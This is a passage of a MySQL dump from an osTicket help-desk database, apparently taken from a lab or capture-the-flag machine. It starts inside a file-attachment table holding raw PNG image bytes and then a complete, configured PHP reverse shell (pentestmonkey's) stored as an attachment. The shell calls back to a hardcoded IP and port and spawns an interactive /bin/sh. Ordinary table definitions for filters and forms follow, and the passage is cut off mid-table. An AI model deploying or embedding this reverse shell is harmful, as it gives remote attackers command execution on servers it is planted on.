b¨4ﬁe‹k<abi2€§ƒ§≈‰æ)Õîköf∫—¥”tÃÃ»,‹¨ÿ¨…Ïé9’úkûaæŸº€¸çÖ•Eú≈Jã6ã«ñ⁄ñ|ÀñMñ˜¨òV>VyVıV◊¨I÷\\Î,Îm÷WlPWõõ:õÀ∂®≠õ≠ƒvõmﬂ‚è)“)ıSn⁄1Ï¸Ï\nÏöÏÌ9ˆaˆ%ˆmˆœÃ÷;t;|rtuÃvlpºÎ§·4√©ƒ©√ÈWgg°sùÛ5¶KêÀóvóSmßäßnüzÀïÂ\ZÓ∫“µ”ı£õªõ‹≠Ÿm‘›Ã=≈}´˚M.õ…]√=ÔAÙ˜X‚qÃ„ùßõß¬ÛêÁ/^v^Y^˚ΩO≥ú&û÷0m»€ƒ[‡ΩÀ{`:>=e˙ŒÈ>∆>üzüáæ¶æ\"ﬂ=æ#~÷~ô~¸û˚;˙À˝è¯ø·yÚÒN`¡ÂΩÅ\ZÅ≥kô•5çª/>B	\rYrìo¿Ú˘c3‹g,ö— ùZ˙0Ã&L÷éÜœﬂ~o¶˘LÈÃ∂à‡Glà∏iô˘})*2™.ÍQ¥Stqt˜,÷¨‰Y˚gΩéÒè©åπ;€j∂rvg¨jlRlcÏõ∏Ä∏™∏Åxá¯EÒót$	Ìâ‰ƒÿƒ=â„sÁlö3ú‰öTñtcÆÂ‹¢πÊÈŒÀûw<Y5Yê|8Öòó≤?ÂÉ BP/OÂßnMÚÑõÖOEæ¢ç¢Q±∑∏J<íÊùVïˆ8›;}C˙hÜOFu∆3	OR+yëíπ#ÛMVD÷ﬁ¨œŸqŸ-9îúîú£R\riñ¥+◊0∑(∑Of++ì\r‰yÊm ìá ˜‰#˘sÛ€lÖL—£¥RÆPL/®+x[[x∏HΩHZ‘3ﬂf˛Í˘#Ç|Ωê∞P∏∞≥ÿ∏xYÒ‡\"øEª#ãSw.1]R∫dxi“}ÀhÀ≤ñ˝P‚XRUÚjy‹ÚéRÉ“••C+ÇW4ï©î…ÀnÆÙZπcaïdUÔjó’[V*ï_¨p¨®Æ¯∞F∏Ê‚WN_’|ıym⁄⁄ﬁJ∑ ÌÎHÎ§În¨˜YøØJΩjA’–Ü\r≠ÒçÂ_mJﬁt°zjıéÕ¥Õ Õ5a5Ì[Ã∂¨€Ú°6£ˆzù]ÀV˝≠´∑æŸ&⁄÷ø›w{ÛÉ;ﬁÔîÏºµ+xWkΩE}ın“ÓÇ›è\Zb∫øÊ~›∏GwO≈ûè{•{ˆEÔÎjtol‹Øøø≤	mR6çH:pÂõÄo⁄õÌöwµpZ*¬AÂ¡\'ﬂ¶|{„PË°Œ√‹√Õﬂô∑ıÎHy+“:øu¨-£m†=°ΩÔËå£ù^Gæ∑ˇ~Ô1„cu«5èWû†ù(=Ò˘‰Çì„ßdßûùN?=‘ô‹y˜L¸ôk]Q]ΩgCœû?tÓL∑_˜…ÛﬁÁè]ºpÙ\"˜b€%∑K≠=Æ=G~p˝·HØ[oÎe˜ÀÌW<ÆtÙMÎ;—Ô”˙j¿’s◊¯◊.]üyΩÔ∆Ï∑n&›∏%∫ı¯vˆÌw\nÓL‹]zèxØ¸æ⁄˝Í˙Í¥˛±e¿m‡¯`¿`œ√YÔ	áû˛îˇ”á·“GÃG’#F#çèù\r\ZΩÚdŒì·ß≤ßœ ~VˇyÎs´Áﬂ˝‚˚KœX¸ÿ˘ãœøÆy©ÛrÔ´©Ø:«#«ºŒy=Ò¶¸≠Œ€}Ô∏Ô∫ﬂ«Ωô(¸@˛PÛ—˙c«ß–O˜>Á|˛¸/˜ÑÛ˚Ä9%\0\0\0tEXtSoftware\0Adobe ImageReadyq…e<\0\0(iTXtXML:com.adobe.xmp\0\0\0\0\0<?xpacket begin=\"Ôªø\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c014 79.156797, 2014/08/20-09:53:02        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/ResourceRef#\" xmp:CreatorTool=\"Adobe Photoshop CC 2014 (Macintosh)\" xmpMM:InstanceID=\"xmp.iid:6E2C95DEA67311E4BDCDDF91FAF94DA5\" xmpMM:DocumentID=\"xmp.did:6E2C95DFA67311E4BDCDDF91FAF94DA5\"> <xmpMM:DerivedFrom stRef:instanceID=\"xmp.iid:CFA74E4FA67111E4BDCDDF91FAF94DA5\" stRef:documentID=\"xmp.did:CFA74E50A67111E4BDCDDF91FAF94DA5\"/> </rdf:Description> </rdf:RDF> </x:xmpmeta> <?xpacket end=\"r\"?>ã˛ˆ \0\0IDATx⁄Ï]	úS’’?/{2…dfÄaqê]67–œ≠(*®-\nˆÛ≥∂.ı+÷÷Ö∫ nµJ¡≠ˆSãR¥’:VDT§,e—2®lÇ†¨ÇÏã3Ã¬Líó˜›õ¸osÊNí…PqÃ˘˝$ìó˜Óª˜¸œ˘üsÔª1ÜNY96§⁄t“ÿÓÔS±/Qƒ˝]k~K°ìÖÓzõ–Ìç>É%4ﬂ§“5∫˙≠<≤Ÿ,≤ÕclmYÛŒ íÑû\'Ù«BØhÙ∑£BÛLZ∏ﬁM?õ§∞\0]sôG÷>æ◊‚Z(4W®]h\r\"“æ&F4ô]ç˛∂?JKD$˙F>Yd-}QäZY†eÂª)≠Ñû*tÄ–”Ñ∂Í‡$ªâ\r	=(tï–ÈBg	=ê¡πÌ¯_Ç¥¢—îQ\0m∆VÌ+≥SèvaäDõW«gÅˆ˝êéBØ˙øBªe¯ùﬁBØ∫LËH°“õ#tÛªB«	˝mFWí\0;t» _éŸÏ@ñÕ—öøxÑﬁ.t!ø[Œ!#‡\\°˜„|…‰Wàí:˜ÿ\rG≥†I≥∑9Èâ“* ç6ÀÅ»≠˘Jk°SÖ˛AËqG¿Nçº\09ù§õEBÔMπ~-4?Ìôù’~„†Iã}‘&∑yÂeYÍÿ¸Â°o\nÌuÑœ{.rªΩBk∏÷iv?äó˙LG∑¥—îµj»-+ﬂëQÊï£\02%>‰|ô Ô(^Õõíﬂ\nÍXËè∆r≥ÊT“œR«Ê-í*ˆˇñÆ-„—R°ÀÖV±øÀBIÀ:G TÃ#˛…5i˛\ZE\"FÛîlD;Ê\\_‰pæ˝sj dÒëìıB\"tá–B)Ù2‰wﬂƒÔœäª˜`îÊ≠Ù–§ï^ö∂—MnA!çÊ<¨YÀ>Üºû•íÌßêˆ\n´ktıMÊJw%˘ªú<.ˇ›¬√BøU\\GÒBI?Á¶ì]\0Ão∆–ÙÂ^˝Ù•∫eFê&.˜ë◊aë«a5Ô±Õö˜±#“£o>§ê=L^´—˛]Féû⁄ﬂJÖN\0ÉGπ˘„ÖæVá\Z˙¢!q#!≈ñ€È¿6=XÍß9õ\\T2»Ô≤®{´ôc—Êç≥,–é)zak≥l¥˙@1ıœﬂ{ù°Ñ^£˝MFî°_b’Ê(7˝9°£≠ë+\'J´÷{hÒónÍê°[\\ÙhiµÛGc41\'\'±MÎ˚1∂é≥œ>;k·«êLõøåﬁ‹›ã˙∑ÿ$‹|∆~,äó›ïîxﬂ ∂l⁄‚(4W.”\ZAj’à¬rù‚„sr…Wùµ…M–Wîr›\"zµhû´>≤Ì;ôßYîÁ™äE,è0ﬁå\\æ\\1ÔbÔ∫ØÂ\"·\'Ñæë¡xÀ¸Íu–LYÃ»£x9ﬂ)¥˘^[\0õPÙXVÁÇNX·•ÕªùT(\"Yè∂âuãﬂWêeÅvä›àRUÿC55AÚÿCô–GY6?ëΩˇ@Ë´⁄1kÑVS|Ç9ù»IÓX Ë£ƒ*êrD \"ÄˆL°ÉÑŒé=*@4È´=N wZjâ9æ%p…ˆ %aÌÒ~è–yBeÅñïò¯Ìµ¥¢¢\rïÏÏK√;HTÎoË+É)æQ…_≈∏t°‘ÎâcIÏUû»±B\"îV⁄™»Vg>L vW¶S‚1õ|ÚXª∂Óp—∞…y¥Ì†ùZx£rR≠≈\'∑#†∞)˝≈WöH™[ ‘çˆ ∫±	›(#Ú=B2ä˚C°€≤@ÀJL,H$À›µ(ÒüN)2ö©∞\'øõ‰òÆ\Zµ‘/*œ\'rZüKD‹˚Vù((ﬂ’g	å≤≈õ{Ä∆Pì]aY« πjﬂä=B≥ù\n\"4~nÄVnwR˜∂ëXéFÒUˇrQsŒêJd‰‹\ZzæÙ7\"‡y°7e©cVéä∏™È˝Ω›Ë‰‡Í%îB˛T`ÀÖSÚO–;]NNy±Xﬁz7‚∂s¥—}ÛÙ‰á~j/®ﬂ¨\rn™¥∑“F√z◊–»*àƒfñ€âÊ¥å5)◊‹EûË°EK|Ù÷j∑4»˘4\rI.Ú¬ñîx∂Õ€ƒ.åj¿6à®GJéG_˜Ü”òëZz1`Nx„Pä„<8¶^˛»$6ìv‘hUYı\nÏçG∂‰Ûjrﬁ¨/^ÔDé•ã§a›Sö£€öIm¬∑Lúï\Z˚^ fùùZÀÜA36∫ck†Â{,\Z9†R‹±@WµQ%†∞Z‰dÛ∑◊„WmˆÜoûñ\'rKä«JˆäˆU0√7YﬁßD~&*ØÿÚ—ˇïá1~ˇÈÖ&=PH:	Ô«eÅ÷∞»Å~πè|‘d4≈ü:Ê“á‚Î\n€„ò{é‘≈£T«π+h≤,Ûãà÷9ww™Õz‰¸X\0Øø˝“Â-áKÄÃN/R€ÕœÃÃ\r›3-HÖÅh+üapymv+“ g…ß•7∑ÚE#Û∂:ÈÍí*πÚÄ€ÍZ;x˘◊ŒÅw…*âØKq®8W‡QÄÃÄ»∂<{Xû&ù“£îxPTRœ;Pƒë ¸#úóõö≤%¬∑\'Ì»H/ºdÅñ¢&AÒy©¯?ôï†≤ÂLj»á6·ê=\"≤9°t9\Z_®ª2I$€ı\0ÈKÌ,⁄-\"Ÿh≤û˘g.›˛v∞∞8ﬂº…aã=®Ÿû]MV*D-z≤c0:Úz7yﬂ…£GœØ(/y=ø|“ß^[π”∫∂ca‰qÅ>—∫Qjã–«)æbDóØŸkyÉüJ@„˝÷còÂ§Kñ∑°†£leh\rKÑ—≈)®„Axn˝vçF8\rìJ∂ùBww*%Gl^ÕñÃã*˘D˚LV‹˛Ü™ ó)Q”x¿Ê1◊NTÒ7oÊù—.ﬂ|ŒeßS¢VÏ>^Ñ—»¸ËB/ë\Zé“Ω«ÕqSEﬁˆ≈>;-ﬁÓ41˙tØˆ°¶iD≈Áìç8Uî}\'—\"ÙOBœzùñ#ÒúÕ≈ﬁw¢¯ñv8;πÑÏI∫F>»:‘π≥„∞Ä‚O4DÂÂ≥róÇ÷·å∆S›mÚ.¶¯F!%¶8‰äõI¨Çy\"˙∫ìÜßã·Ñe€*H‡NE√f£t5≈ÁK#¡ÆLíõB‚Á≈E¡3„Ÿ6Pï†À˝$äV72ˆ„;‹ËP\"1˙√ì»π†˘‡Úƒ°⁄πÉ‘\\y®’ ‰(™rˇ\"™W≤>ùïÉ™›z˙SÒ}ãÍ|?Aü»6N£¯äyŒãp9H´í\0¢≠äƒ6¬1ã6 ßP‘Z}iÕ\"ßç≤R7≈%íﬁOﬁËƒç˚Ì—ãkCU!j/@61‡≤z	 \'Ûâ[Ñ~•Âw◊£˙7V\0q_Æ+ˆ}Íòo^e4\"6∂âéΩ¬®ÙsÑ˛∂Ù!≈◊\\r‚ kûJN≠TÚó$@ìQ˜N™øÆS…˘†•ÈÊÃ$yZ(_ı:Î{È¿‰W,î§\r∑/Éπuπ\Zs÷xÜÁ—∞qhËÿÊÇÁ´–.üﬁ}	ûäãÏg(æb[\Z÷sL7„¸RF°‰+Ø%°(¡ﬂG√8\"4§rÅÍ)⁄5V¬Ç6IèŸFı\r:Ô XR>9±⁄Q;G)⁄¥ÔÔ¶¯¿^ñ”L»∞R∆#ãÃ”.c‡/¬†ı¿5/d‘Izf9π,ÁõÊ}Og+>{8æ≤æxqÔ*ÍÓ¿kπÇ^ﬂZ`5¢ rπu¿‹u˙∫ †æË\"íIêÕE[uTã\\µ\n—qå»ﬂfÂ∫-Èœµ‚Õ∫/I4%8¥{0∆7\"W+k†´ºTÖåGa_ÈdC:∂ˆ®2Ÿ∆·∏ﬂv\0›YÏÛµ»-ª£ﬂ{¿∂˙0«üNÏ6V˝Ò¬‡˚!1˝öyàö\0@ÅLFôyË@:ˆ:xÊ:¨/+Eü√Æu.^f=0	≤W»V\"bÖ¶K–5¨3G†ÌÑht∏#¿+¡ı>?˜‡«Ω=Çˆò0é}0ûŒt†…º◊¥u\r˛Và∂ 9¨)åft—º~;ºûWü9Xt»t∆ä#)\n6Ex˝9r¢Û·8∏ºÎ_KÄÃ•gËëóÊD˚äúÏ¨öø+	»∏º\nêÏ·Z≠Ù˛uöÔ-@ﬂG›L Ú©¢›M\Z»¬`“Ò^NÒ\rÇ^F•»´	«›»ﬁœ` #∏ŒbLÂFD⁄~îx÷é@7üÑ”:…€˛!lÚ1¿l\Zóï\'˛9@p)ãb·PbNÊUPÆÛq¨‚¨˜Ò˛tÄË8ùí\"ñ\'™\r\\&!¬™≤∑„&OGG◊Çbﬁnf`] 0ÁËN=m?ëœkı¬Î€XÔF$?µ±2¸bP\n±¡ÿïp∂0òÎ{ıEAohøå|ÆÍd˘YÎ∑E,«qjQeò0◊ÌT`“ÀK|4bf.‰D…fãıáå⁄o≥ËûN‘D¯√Å™“˝=l,uŸÅ1π\\£§çïvﬂUããºÓP∞öw¿BÆG_˚)1ß\0ªNüo©∞Å°ñ•CÿÁƒ∆Á&“Å˚ÿÁóÅÕ<Pq~ˇ6™Æ≤ùcmZòû¿Êb>∆	î\\£UÜÒ£ˇÇ\' ¯y¯>!‹∂Fæ‰G¥,ÕG‰≤ MO…f  uQÁÏ¿’‡˝nx™©àä™HrL<‹4ä?f/Â†qR¶ÉÍJ øç…§%e\"£â»2és!÷ßå!®Ø\'Û~ÀÎp\r#JeÂπ+R=uùÀ˙m£^JæÇUí|®≤ FÔopìCºˆ˙(h_oI3ôÃ]puB4˚+Æq.¢÷Cóç∂I[ŸIMõgTm(ã¸FÚáFúg/\"ÍXñ∑ÆAˇ]ôØ\03#∞®)IŒ5„≠rÿ¨¿c”®} ™„G⁄˚Ö@©@Qæ|\0∫¬E(àNëûÂwîÿÃ•˛uDŒK\0ñ˛h‘*‰Y™C•.É1€‡UrX4<ûy¢≈Ãê;≤»˘_Bø@áD1p~mxﬁVÀﬁØËªg¥5ZeÚ+x–„‡H∂Ã\'√P\rDÈæ¨üÎÄlw≠ü˙ˆPÕÃd˘xÏ>]h˜¸≠Bã∞õ’Gºæ‘GØ≠R∑¬à|»“`˝úÈèQÏÅÍv¢€”†¿BøÜC,EÓ∂àRO¯g*µ˜/6Ú˚9†p™8!ƒ≠åÊÏîØ†q\"BZ45xH2≈¢-G:†ôI83%©æ’$ÒÇ|ôãaY€\0<‹¥§ZΩ»W≥õÿ0Ï&™—ÊœaTnÕ‡Uπÿ√¢”Ztöù¶ep™\Zÿ‘i#EøôåF®6Œ˝È*€Ì\\ÁÛoæ≠&H\'	ê=–c6πm\"ƒ∂6®WÈ∆‹JVQSq*Í≤®bßì¶,ÛQõ†©ûd∂±{Œ4“{r≤± u!∆≤Ë◊F°n£¶-ËµíÃñ7aÆÌL≠∏ëÉÍ7i@„{PûLÈñÆ%$ê¬(–Ù\'q˚∞c∂Ä√w`ûî`@˘à5	¥eˆ¿∞‘„\Zó≤»Ú9¿f’£°öóV%ıÆØ¢ìùM(ñ√´˙qŒa˙Ísæﬂ˜QÄË®w^Àìw“\nRZ0«≤ãEÕO‡tn`≈á≈Ëó∏eY=ﬁm.˘˜í\'2_™˝CN`∆Æä(!ñk«˚M–ƒç˚4uùõ∫%º4)±èH¶[¯–/™;ı˝}\\å˛8õ*‰X¸å‘=Mwh\r\Zt\n—\\\'\"‹\n∆ÑÏZ~M3µÅ-9Ÿ8⁄R8â§gÜ_@uWN¿Ê4∫≤Íìöœπõ5b5ÀÛT^RcSVhßb‡>b\0#‰èÿ5:°,˚wÃcTß®Pmaù◊˘¢˙º\'¶ ˛E	e0√X‘éBIãFx\\yæï¿UÏı\"≠8°ré„ı[¸ÑEﬁr:!5àdIAñ«hÌ\'Z4Wt∞∂Å∂ØgŒ4ÈÜ≤ˆv‰<«Q˝]à-Ùˇ\\‚ÿA(5`m,Ø	Áöå¬âíV®\Z˙XdØ—*¶ÁPbéı<¶B%+˚#c.V*†ÈÌPéîò,V’ôy(:å\0∞F#\"|Fu7Üô¡™l+\0(øñ¥Ô≈ÄÙbÛü≤ÇÃ`x⁄óPR˝7’ù*)˘.^U(Ë\\éŒúä˜;Ü∂ËÑ´P–ô\0Éyó\Z¿ôÍ«ÒË¸\0àjÀÏ8ôß˝\Z«–Ûìﬁ›yŸdÖQÊe©üÆZÛ	∆EO¿∑˝€h¬u)à––Óµ¥hª3∂!õ[SUƒ\'®·_åàq¸¢ı«(.˝îROØB—bÚ∫Wõ—∂hÔØ‘ãG\r»N´÷¿)ûŒÓÈ|V¶F¸hˇ¡&D]ÓÙÍE4 kèy6hw‚ı†=ﬂ‡ƒ?D©Ω\'õ≥πïu¸b-·Ts˚òGï≤îy≠yà¨`8ó¢ﬂ«<Ö\na+V¬\rh˜2	Ûxö´1◊—ñMAºÅyó)lﬁk$∏¸≥¨Hë√yô7¸˝t\r¢ïjÀHÙ/6-”J¿u&<}\"¢Qƒïn@{≥jK\Zµ.`-N±B⁄ÜÈö”´hµM/^ïÇù\\ﬂÄ1vS√/GJPî!Ω6#¢Ω£9∂:Cb˝±ˆÄÊDƒçR›_Ã9ç¯ÜC\rã˛SU]SE4;ºÚ–B™oØ\"¢(˘¯˜Px)\'åÂÃµp ≤‘	ﬁù”ú{àPÔ4	˛Â0,@:—LïçÅ\\j’_˘g˘08Ç0Ócã\"!‹Î,x77ÆÒ\Z\nùùd˚\"~Åh‡ÉÁìÁ∫˘ﬁ~Pï9I∏˝,FSÁ‘;km@F2?\n%˚5z|:˙∏5h–DÌ€CÿtG¬TETìÂ}-˛ÀqzÁ{\n•˚iIÓ≥Qø3˛#ÊÃdt˛-∆!ŸDWD“#w#e&∞ö\ZÒ¿QND˚wÅïÄ›îjÌq≤¢‘{p§£kõß£+‹è{gZ«´r–•l´¡\"¸lém$l€p$I?Ä1ª`<…¯À:$ìÍÏBiÊbñBìùc]öŒ›Äk8qç∞vçCîdíWìËxUﬁ\'πyûø¿°¨†QíÈ.à=oÖÅ3µÅVÖò %ñ˛|Fı◊=äV +≠û$ãE\'^9Oı7KÌœLıÉËΩ≤ZÖ‰»´≥IŒ4x¯áa∞œ¬Aï·>Œƒgù–è∑≥≥æ\0`_c:\Z¡ò\rF¥(D‰ù~@3—∑3)±æS:∏ﬂ _?µÄì\\®M)Ë¥Ó8÷~x/∆Ô¡∆F!’PnÈp/ÿΩÂÿ%h[p›ãXes,⁄æƒë¢\nieêL”ò…D˜ÅJKKrè÷uîAò)J¿w\"ˆd¥±˛Ú•x^∂Ã‚W»˚\np”…Ê$π∆\0D˜(¢-ã]ù]¢”:ÜhkπùÁiÑ¸d3˛ø™èÒ+Ó;ÿﬂUn˛4\nK…∂P(P«h˝Î◊\n;^ª∆≤î,]|ûÑXæÀ´±Tw	Vû∆ﬁv\0ºu™øè‡æûbS(¡’ŸñZ?=g`xí⁄—°5¿MY9\ZíÉ\\SÅl3®e:Y	jÊBn©v°J5ós˚z“ùS–∆.\'‘“%õjhÃúÄ\0Z=_\Z¢Û•òˆh`oe[ö‚∫À)Ò#Ò2ßi∞ÏùüM…7◊ôébV˜ı´ÑN@tÚS˝_]äÎ˝ˇwfHuÕôHe¶„m–Èˇ€Hk ZµD€Ω¯Ó\'(òùÉäπNTªÁ|_;Á\"¥ÎVJLç…îiæÒÚÀ/˜Bhå†ë≥∏8‚\"©∆/·!w¬˚öÏ¿Î F5Â¸vT!+Q¡≠/AìFO“ò“Í4õCü\Zp0jCï\nJÃ\'6∏£Qö~‘7vD3/ÿB5®™’@€Z p…„À˛_Ä\0≥‡Øòs]J˝\0\0\0\0IENDÆB`Ç'),(2,0,'Canned Attachments Rock!'),(3,0,'<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  The author accepts no liability\n// for damage caused by this tool.  If these terms are not acceptable to you, then\n// do not use this tool.\n//\n// In all other respects the GPL version 2 applies:\n//\n// This program is free software; you can redistribute it and/or modify\n// it under the terms of the GNU General Public License version 2 as\n// published by the Free Software Foundation.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License along\n// with this program; if not, write to the Free Software Foundation, Inc.,\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  If these terms are not acceptable to\n// you, then do not use this tool.\n//\n// You are encouraged to send comments, improvements or suggestions to\n// me at pentestmonkey@pentestmonkey.net\n//\n// Description\n// -----------\n// This script will make an outbound TCP connection to a hardcoded IP and port.\n// The recipient will be given a shell running as the current user (apache normally).\n//\n// Limitations\n// -----------\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n//\n// Usage\n// -----\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = \'10.10.14.157\';  // CHANGE THIS\n$port = 443;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \'uname -a; w; id; /bin/sh -i\';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists(\'pcntl_fork\')) {\n	// Fork and have the parent process exit\n	$pid = pcntl_fork();\n	\n	if ($pid == -1) {\n		printit(\"ERROR: Can\'t fork\");\n		exit(1);\n	}\n	\n	if ($pid) {\n		exit(0);  // Parent exits\n	}\n\n	// Make the current process a session leader\n	// Will only succeed if we forked\n	if (posix_setsid() == -1) {\n		printit(\"Error: Can\'t setsid()\");\n		exit(1);\n	}\n\n	$daemon = 1;\n} else {\n	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\n// Change to a safe directory\nchdir(\"/\");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n	printit(\"$errstr ($errno)\");\n	exit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n	printit(\"ERROR: Can\'t spawn shell\");\n	exit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won\'t\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n	// Check for end of TCP connection\n	if (feof($sock)) {\n		printit(\"ERROR: Shell connection terminated\");\n		break;\n	}\n\n	// Check for end of STDOUT\n	if (feof($pipes[1])) {\n		printit(\"ERROR: Shell process terminated\");\n		break;\n	}\n\n	// Wait until a command is end down $sock, or some\n	// command output is available on STDOUT or STDERR\n	$read_a = array($sock, $pipes[1], $pipes[2]);\n	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n	// If we can read from the TCP socket, send\n	// data to process\'s STDIN\n	if (in_array($sock, $read_a)) {\n		if ($debug) printit(\"SOCK READ\");\n		$input = fread($sock, $chunk_size);\n		if ($debug) printit(\"SOCK: $input\");\n		fwrite($pipes[0], $input);\n	}\n\n	// If we can read from the process\'s STDOUT\n	// send data down tcp connection\n	if (in_array($pipes[1], $read_a)) {\n		if ($debug) printit(\"STDOUT READ\");\n		$input = fread($pipes[1], $chunk_size);\n		if ($debug) printit(\"STDOUT: $input\");\n		fwrite($sock, $input);\n	}\n\n	// If we can read from the process\'s STDERR\n	// send data down tcp connection\n	if (in_array($pipes[2], $read_a)) {\n		if ($debug) printit(\"STDERR READ\");\n		$input = fread($pipes[2], $chunk_size);\n		if ($debug) printit(\"STDERR: $input\");\n		fwrite($sock, $input);\n	}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we\'ve daemonised ourself\n// (I can\'t figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n	if (!$daemon) {\n		print \"$string\\n\";\n	}\n}\n\n?> \n\n\n\n');
/*!40000 ALTER TABLE `ost_file_chunk` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_filter`
--

DROP TABLE IF EXISTS `ost_filter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_filter` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `execorder` int(10) unsigned NOT NULL DEFAULT 99,
  `isactive` tinyint(1) unsigned NOT NULL DEFAULT 1,
  `flags` int(10) unsigned DEFAULT 0,
  `status` int(11) unsigned NOT NULL DEFAULT 0,
  `match_all_rules` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `stop_onmatch` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `target` enum('Any','Web','Email','API') NOT NULL DEFAULT 'Any',
  `email_id` int(10) unsigned NOT NULL DEFAULT 0,
  `name` varchar(32) NOT NULL DEFAULT '',
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `target` (`target`),
  KEY `email_id` (`email_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_filter`
--

LOCK TABLES `ost_filter` WRITE;
/*!40000 ALTER TABLE `ost_filter` DISABLE KEYS */;
INSERT INTO `ost_filter` VALUES (1,99,1,0,0,0,0,'Email',0,'SYSTEM BAN LIST','Internal list for email banning. Do not remove','2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_filter` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_filter_action`
--

DROP TABLE IF EXISTS `ost_filter_action`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_filter_action` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `filter_id` int(10) unsigned NOT NULL,
  `sort` int(10) unsigned NOT NULL DEFAULT 0,
  `type` varchar(24) NOT NULL,
  `configuration` text DEFAULT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `filter_id` (`filter_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_filter_action`
--

LOCK TABLES `ost_filter_action` WRITE;
/*!40000 ALTER TABLE `ost_filter_action` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_filter_action` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_filter_rule`
--

DROP TABLE IF EXISTS `ost_filter_rule`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_filter_rule` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `filter_id` int(10) unsigned NOT NULL DEFAULT 0,
  `what` varchar(32) NOT NULL,
  `how` enum('equal','not_equal','contains','dn_contain','starts','ends','match','not_match') NOT NULL,
  `val` varchar(255) NOT NULL,
  `isactive` tinyint(1) unsigned NOT NULL DEFAULT 1,
  `notes` tinytext NOT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `filter` (`filter_id`,`what`,`how`,`val`),
  KEY `filter_id` (`filter_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_filter_rule`
--

LOCK TABLES `ost_filter_rule` WRITE;
/*!40000 ALTER TABLE `ost_filter_rule` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_filter_rule` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_form`
--

DROP TABLE IF EXISTS `ost_form`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_form` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `pid` int(10) unsigned DEFAULT NULL,
  `type` varchar(8) NOT NULL DEFAULT 'G',
  `flags` int(10) unsigned NOT NULL DEFAULT 1,
